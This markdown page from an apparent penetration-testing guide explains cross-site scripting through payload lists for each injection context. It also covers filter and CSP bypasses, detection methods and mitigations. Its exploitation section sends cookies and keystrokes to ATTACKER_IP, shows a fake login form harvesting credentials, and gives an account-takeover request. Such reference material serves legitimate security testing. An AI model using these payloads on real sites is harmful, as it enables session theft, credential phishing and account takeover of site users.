% Filename: 04-web-testing/client-side/xss.md
% Display name: Cross-Site Scripting (XSS)
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1189 (Drive-by Compromise)
% Authors: @TristanInSec

# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in its HTML output without proper sanitization or encoding. The attacker's JavaScript executes in the victim's browser within the application's origin — accessing cookies, session tokens, DOM content, and making authenticated requests. XSS is the most prevalent client-side vulnerability.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1189 - Drive-by Compromise

## Prerequisites

- Application reflects or stores user input in HTML responses
- Insufficient output encoding or Content Security Policy
- Victim visits the page containing the payload (reflected/DOM) or the stored payload

## Detection Methodology

### Identifying Reflection Points

Inject a unique string (e.g., `xss_test_12345`) into every input and search the response source for it. Track where it appears:

- **HTML body** — `<div>xss_test_12345</div>`
- **HTML attribute** — `<input value="xss_test_12345">`
- **JavaScript string** — `var x = "xss_test_12345";`
- **URL/href** — `<a href="xss_test_12345">`
- **CSS** — `style="color: xss_test_12345"`
- **HTML comment** — `<!-- xss_test_12345 -->`

The context determines which characters need to break out and which payload will work.

### Boundary Testing

After finding a reflection point, test which characters survive:

```text
< > " ' / ( ) ; { } =
```

If `<` and `>` are reflected unencoded in HTML body context, basic tag injection works. If only `"` is reflected in an attribute, event handler injection is needed.

## Techniques

### Reflected XSS

Input is included in the immediate response. The payload travels through the URL or POST body — the victim must click a crafted link.

**HTML body context:**

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<marquee onstart=alert(document.domain)>
```

**HTML attribute context (breaking out of attribute):**

```html
" onmouseover="alert(document.domain)
" onfocus="alert(document.domain)" autofocus="
"><script>alert(document.domain)</script>
"><img src=x onerror=alert(document.domain)>
```

**JavaScript string context:**

```javascript
';alert(document.domain);//
"-alert(document.domain)-"
\';alert(document.domain);//
</script><script>alert(document.domain)</script>
```

**URL/href context:**

```html
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

### Stored XSS

Input is saved server-side (database, file, log) and rendered to other users later. Higher impact than reflected — no victim interaction beyond visiting the page. Common storage points:

- User profile fields (name, bio, avatar URL)
- Comments, forum posts, reviews
- File names and metadata
- Support tickets, chat messages
- Log entries viewed by administrators

The payloads are identical to reflected XSS — the difference is delivery (stored vs. URL).

### DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript. The server response does not contain the payload — the browser's DOM processing introduces it.

**Sources** (where attacker-controlled data enters):
- `document.location` / `location.hash` / `location.search`
- `document.referrer`
- `window.name`
- `postMessage` data
- Web storage (`localStorage`, `sessionStorage`)

**Sinks** (where data gets executed):
- `innerHTML`, `outerHTML`
- `document.write()`, `document.writeln()`
- `eval()`, `setTimeout()`, `setInterval()`, `Function()`
- `element.setAttribute()` with event handlers
- `jQuery.html()`, `$.append()`, `$.after()`
- `location.href`, `location.assign()`, `location.replace()`

**Example — hash-based DOM XSS:**

```javascript
// Vulnerable code
var query = location.hash.substring(1);
document.getElementById('output').innerHTML = query;

// Exploit URL
http://target.com/page#<img src=x onerror=alert(document.domain)>
```

**Example — postMessage DOM XSS:**

```html
<!-- Attacker's page -->
<iframe src="http://target.com/page" id="target"></iframe>
<script>
document.getElementById('target').contentWindow.postMessage(
  '<img src=x onerror=alert(document.domain)>', '*'
);
</script>
```

## Filter Bypass Techniques

### Tag and Event Handler Bypass

When common tags like `<script>` are blocked:

```html
<!-- Less common tags -->
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
```

### Case and Encoding Bypass

```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML entity encoding in attributes -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;">

<!-- URL encoding in href/src -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Double encoding (if server decodes once, WAF checks, then renders) -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Null bytes (older parsers) -->
<scri%00pt>alert(1)</scri%00pt>
```

### JavaScript Execution Without Parentheses

When `(` and `)` are filtered:

```html
<img src=x onerror=alert`1`>
<img src=x onerror=throw/a]/<@z;onerror=alert%281%29//>
<svg onload=location='javascript:alert\x281\x29'>
```

### Keyword Bypass

When `alert` or `script` keywords are filtered:

```html
<!-- Alternative alert functions -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>

<!-- String construction -->
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>

<!-- eval with string building -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### CSP Bypass Techniques

When Content-Security-Policy restricts script execution:

```html
<!-- If 'unsafe-inline' is allowed (weak CSP) -->
<script>alert(1)</script>

<!-- If a CDN domain is whitelisted (e.g., cdnjs.cloudflare.com) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp ng-click=$event.view.alert(1)>click</div>

<!-- JSONP endpoint on a whitelisted domain -->
<script src="https://whitelisted.com/api?callback=alert(1)//"></script>

<!-- base tag hijack (if base-uri not restricted) -->
<base href="https://attacker.com/">
```

## Exploitation Payloads

### Session Hijacking

```javascript
// Cookie theft (if HttpOnly is not set)
new Image().src='http://ATTACKER_IP:8000/?c='+document.cookie;

// Fetch-based exfiltration
fetch('http://ATTACKER_IP:8000/?c='+document.cookie);
```

### Keylogging

```javascript
document.onkeypress=function(e){
  new Image().src='http://ATTACKER_IP:8000/?k='+e.key;
}
```

### Phishing via DOM Manipulation

```javascript
document.body.innerHTML='<h1>Session Expired</h1><form action="http://ATTACKER_IP:8000/"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><input type="submit" value="Login"></form>';
```

### CSRF via XSS

```javascript
// Change email/password via authenticated request
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/account/email', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');
```

## Automated Testing

### Browser Developer Tools

DOM XSS testing workflow:
1. Open DevTools Console
2. Search JavaScript source for sinks (`innerHTML`, `document.write`, `eval`)
3. Trace backwards to find the source of data flowing into each sink
4. Test if attacker-controlled data reaches the sink without sanitization

### Burp Suite Scanner

Burp Suite's active scanner detects reflected and stored XSS automatically. For DOM XSS, use the DOM Invader extension (available in Burp's built-in browser).

## Detection Methods

### Network-Based Detection

- HTML tags and JavaScript in HTTP parameters (`<script>`, `onerror=`, `onload=`, `javascript:`)
- Encoded variants of script keywords in requests (hex, unicode, HTML entities, base64)
- Outbound requests from user browsers to unexpected domains (cookie exfiltration)

### Host-Based Detection

- Content Security Policy violation reports (`report-uri` / `report-to` directives)
- WAF logs showing XSS signature matches
- Application logs with HTML/JavaScript in parameter values
- CSP `report-only` mode to detect XSS attempts without blocking

## Mitigation Strategies

- **Context-aware output encoding** — encode data based on where it appears in the response:
  - HTML body: HTML entity encoding (`<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`)
  - HTML attribute: attribute encoding + quote the attribute value
  - JavaScript: JavaScript Unicode escaping (`\uXXXX`)
  - URL: percent encoding
  - CSS: CSS hex encoding
- **Content Security Policy (CSP)** — restrict script sources. A strong CSP: `default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`. Avoid `unsafe-inline` and `unsafe-eval`
- **HttpOnly cookies** — prevents JavaScript access to session cookies, blocking cookie theft via XSS (does not prevent other XSS exploitation like CSRF or DOM manipulation)
- **Input validation** — whitelist expected formats where possible (emails, numbers, dates). Reject unexpected characters. Input validation alone is insufficient — always combine with output encoding
- **Use safe APIs** — prefer `textContent`/`innerText` over `innerHTML`, use parameterized DOM methods over `document.write()`
- **Trusted Types** — browser API that enforces safe creation of DOM XSS sink inputs. Prevents string assignment to dangerous sinks

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP - XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)
